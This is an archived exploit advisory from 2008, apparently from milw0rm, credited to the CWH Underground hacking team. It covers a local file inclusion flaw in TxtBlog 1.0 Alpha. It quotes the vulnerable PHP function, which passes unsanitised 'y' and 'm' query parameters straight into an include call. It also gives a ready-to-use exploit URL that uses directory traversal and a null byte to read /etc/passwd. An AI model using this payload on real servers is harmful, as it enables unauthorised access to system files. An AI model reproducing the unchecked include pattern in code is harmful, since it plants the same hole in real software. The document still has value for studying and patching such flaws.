<html><head><title>TxtBlog (index.php m) Local File Inclusion Vulnerability</title></head><pre>============================================================
  TxtBlog (index.php m) Local File Inclusion Vulnerability
============================================================

  ,--^----------,--------,-----,-------^--,
  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
  `+---------------------------^----------|
    `\_,-------, _________________________|
      / XXXXXX /`|     /
     / XXXXXX /  `\   /
    / XXXXXX /\______(
   / XXXXXX /           
  / XXXXXX /
 (________(             
  `------'


AUTHOR : CWH Underground
DATE   : 27 November 2008
SITE   : cwh.citec.us


#####################################################
 APPLICATION : TxtBlog
 VERSION     : v.1.0 Alpha
 DOWNLOAD    : http://downloads.sourceforge.net/txtblogcms/txtblogcms-1.0a.zip
#####################################################

--- Local File Inclusion ---

-----------------------------
 Vulnerable File (index.php)
-----------------------------

function showMonth() {
	global $config_date_format, $txtblog_body, $txtblog_title, $config_title;

	$txtblog_body = &quot;&quot;;
	$txtblog_title = &quot;$config_title - Archives&quot;;

	$year = $_GET['y'];			
	$month = $_GET['m'];				

	$files = findFiles(&quot;data/$year/$month&quot;);	&lt;&lt;&lt; BUG !!!!
	
	if (isset($files)) {
	foreach ($files as $file) {
				
		include (&quot;data/$year/$month/$file&quot;);	&lt;&lt;&lt; BUG !!!!
		$date_array = explode(&quot; &quot;,$date);
		$date = date($config_date_format, mktime($date_array[0], $date_array[1], $date_array[2], $date_array[3], $date_array[4], $date_array[5]));
		$txtblog_body .= &quot;&lt;span class='blog_title'&gt;$title&lt;/span&gt;&lt;br&gt;\n&lt;span class='blog_date'&gt;$date&lt;/span&gt;&lt;br&gt;\n&quot;.bb2html($blog).&quot;&lt;br&gt;\n&lt;hr size='1'&gt;\n&quot;;

	}
	}
}

---------
 Exploit
---------

[+] http://[Target]/[txtblogcms_path]/index.php?y=2005&amp;m=01/../../../../../../../../etc/passwd%00


#######################################################################################
Greetz      : ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos, Gdiupo, GnuKDE, JK
Special Thx : asylu3, str0ke, citec.us, milw0rm.com
#######################################################################################

# milw0rm.com [2008-11-27]</pre></html>